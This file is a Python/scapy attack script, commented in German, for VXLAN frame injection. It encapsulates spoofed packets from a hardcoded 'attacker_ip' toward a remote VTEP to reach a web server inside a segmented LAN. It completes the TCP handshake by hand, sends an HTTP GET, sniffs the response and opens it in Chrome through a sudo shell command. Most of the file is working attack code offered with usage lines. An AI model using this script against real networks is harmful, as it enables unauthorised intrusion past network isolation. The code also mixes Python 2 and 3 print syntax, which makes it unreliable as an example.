#!/usr/bin/env python

"""
Usage:
./http_asym.py IP Port debug 

./http_asym.py 10.0.0.10 80 debug

 """
from scapy.all import *
from scapy.layers.http import *
from scapy.layers import http
import random
import sys
import threading
from threading import Thread
import time
import webbrowser
import os


### Variabeln definieren
vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
mac_src = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
http_port = int(sys.argv[2])
dest = sys.argv[1]
s_port = random.randint(20000,65500)

# TCP-Flags definieren
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

### Check if debug is enabled
if len(sys.argv) > 3:
    debug = 1
else:
    debug = 0

### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
### getStr ist der String im HTTP Request
getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'

#$$$$$ SEND TCP Package
def send_tcp(src_port, seqnr, acknr, tcp_flags):
    ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
    out_ack = send(ack, verbose=0)
    return

#$$$$$ SEND HTTP Request
def syn_ack_received_send_http_req(src_port, seqnr, acknr):
    http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
    send(http_request, verbose=0)
    if debug:
        print("############## HTTP Request sent #####################")
        print("srcport = " + str(src_port)) 
        print("ACK# = " + str(acknr))
        print("SEQ# = " + str(seqnr))
        print("")





### Sniff Funktion fuer sniff_http_response_thread
http_content = ""
def get_http_packet1(packet):
    if packet.haslayer(HTTPResponse) is True:
        global http_status
        ### http status ist die Response Status Nachricht. zB HTTP1.1/200/OK
        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
    if packet.haslayer(Raw) is True:
        global http_content
        ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
        http_content += str(packet.getlayer(Raw).load)




### Sniff Funktion um HTTPResponse zu finden
# Sie filtert auf TCP Pakete mit der ACK Nummer 58. Der Request hast eine Laenge von 57. Die Ack Nummer ist Length + 1
def sniff_http_response_thread():
    sniff(session=TCPSession, filter = "tcp port 80", prn=get_http_packet1, store=False, count = 5)


    print(http_status)
    print("")
    print(http_content)
        ### Oeffne Google Chrome mit der Website
    http_body = http_content.partition("\r\n\r\n")[2]
    f = open("website.html", "w")
    f.write(http_body)
    f.close()
    new = 2
    url = "/home/ben/http_request/website.html"
    os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
    return





def worker(packet):
    payload_length = len(packet[TCP].payload)
    flags = packet.getlayer(TCP).flags
    in_seq = packet[TCP].seq
    in_ack = packet[TCP].ack
    dst_port = packet.getlayer(TCP).dport
    if debug:
        print ("IP Source:          " + str(packet.getlayer(IP).src) + ":" + str(packet.getlayer(TCP).sport))
        print ("IP Destin:          " + str(packet.getlayer(IP).dst) + ":" + str(packet.getlayer(TCP).dport))
        print("TCP Payload Length:  " + str(payload_length))
        print("Flags:               " + str(flags))
        print("TCP ACK#:            " + str(in_ack))
        print("TCP SEQ#:            " + str(in_seq))
        if flags & PSH:
            print "PSH Flag set"
        if (flags & (SYN ^ ACK)) == 18:
            print "SYN/ACK --> both Flags set"
        else:
            if flags & SYN:
                print "SYN Flag set"
            if flags & ACK:
                print "ACK Flag set"
        if flags & FIN:
            print "FIN Flag set"

    #### ACK# = SEQ# + Payload Länge + 1
    #### SEQ# = ACK#
    ack_nr = in_seq + payload_length + 1
    seq_nr = in_ack

    if payload_length > 0 or (flags & (SYN ^ ACK)) == 18:
        send_flags = 'A'
        if debug:
            print ("ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
        if (flags & (SYN ^ ACK)) == 18:
            syn_ack_received_send_http_req(dst_port, seq_nr, ack_nr)
    if flags & FIN:
        send_flags = 'F''A'
        if debug:
            print ("FIN/ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
    if debug:
        print ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n\r\n\r\n")
    return

### Thread Klasse initiieren fuer ACK
class Sniff_Thread (threading.Thread):
   def __init__(self):
      threading.Thread.__init__(self)
   def run(self):
      sniff_all_packets()

### Thread Klasse initiieren fuer HTTP Resp
class Sniff_HTTP_Thread (threading.Thread):
   def __init__(self):
      threading.Thread.__init__(self)
   def run(self):
      sniff_http_response_thread()



threads = []
def start_TCP_IN_Thread(packet):
    global threads
    t = threading.Thread(target=worker, args=(packet,))
    threads.append(t)
    t.start()

def sniff_all_packets():
    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=start_TCP_IN_Thread, store=False, count = 5)
    return





SNIFFER = Sniff_Thread()
HTTP_SNIFFER = Sniff_HTTP_Thread()
HTTP_SNIFFER.start()
SNIFFER.start()
time.sleep(1)


#$$$$$ SEND SYN
syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
send(syn, verbose=0)
if debug:
        print("############## SYN packet sent #####################")
        print("dport von SYN = " + str(http_port))
        print("Source IP Address = " + str(attacker_ip))
        print("Destination IP Address = " + str(dest))
        print("")


